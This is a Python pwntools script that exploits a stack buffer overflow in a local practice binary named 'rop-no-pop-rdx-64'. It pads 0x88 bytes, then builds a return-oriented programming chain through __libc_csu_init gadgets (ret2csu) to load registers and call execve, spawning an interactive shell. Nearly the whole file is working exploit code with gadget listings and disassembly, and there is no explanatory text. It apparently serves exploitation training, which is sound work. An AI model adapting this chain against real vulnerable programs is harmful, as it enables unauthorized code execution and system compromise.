#!/usr/bin/env python

from pwn import *

p = process("./rop-no-pop-rdx-64")
"""
0x00000000004006fc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004006fe : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400700 : pop r14 ; pop r15 ; ret
0x0000000000400702 : pop r15 ; ret
0x00000000004005c2 : pop rbp ; mov byte ptr [rip + 0x200a86], 1 ; ret
0x000000000040054f : pop rbp ; mov edi, 0x601050 ; jmp rax
0x00000000004006fb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004006ff : pop rbp ; pop r14 ; pop r15 ; ret
0x0000000000400560 : pop rbp ; ret
0x0000000000400703 : pop rdi ; ret
0x0000000000400701 : pop rsi ; pop r15 ; ret
0x00000000004006fd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
"""
pop_r12_r13_r14_r15_ret = 0x4006fc
pop_r13_r14_r15_ret = 0x4006fe
pop_r14_r15_ret= 0x400700
pop_r15_ret = 0x400702

pop_rdi_ret = 0x400703
pop_rsi_r15_ret = 0x400701

addr_execve = p.elf.symbols['execve']

string_04 = 0x400194

payload = "A" * 0x88


payload += p64(pop_rdi_ret) + p64(string_04)

"""
4006e0:   4c 89 ea                mov    %r13,%rdx          # r13 = 0
4006e3:   4c 89 f6                mov    %r14,%rsi          # r14 = 0
4006e6:   44 89 ff                mov    %r15d,%edi         # rbx = 0
4006e9:   41 ff 14 dc             callq  *(%r12,%rbx,8)     # r12 = pop ret
4006ed:   48 83 c3 01             add    $0x1,%rbx
4006f1:   48 39 eb                cmp    %rbp,%rbx
4006f4:   75 ea                   jne    4006e0 <__libc_csu_init+0x40>
4006f6:   48 83 c4 08             add    $0x8,%rsp
4006fa:   5b                      pop    %rbx
4006fb:   5d                      pop    %rbp
4006fc:   41 5c                   pop    %r12
4006fe:   41 5d                   pop    %r13
400700:   41 5e                   pop    %r14
400702:   41 5f                   pop    %r15
400704:   c3                      retq
"""
pop_rbx_rbp_r12_r13_r14_r15 = 0x4006fa
payload += p64(pop_rbx_rbp_r12_r13_r14_r15)
# rbx
payload += p64(0)
# rbp
payload += p64(1)
# r12
payload += p64(0x601030)
# r13
payload += p64(0)
# r14
payload += p64(0)
# r15
payload += p64(string_04)

payload += p64(0x4006e0)

with open('exploit.txt','wb') as f:
    f.write(payload)

p.sendline(payload)

p.interactive()
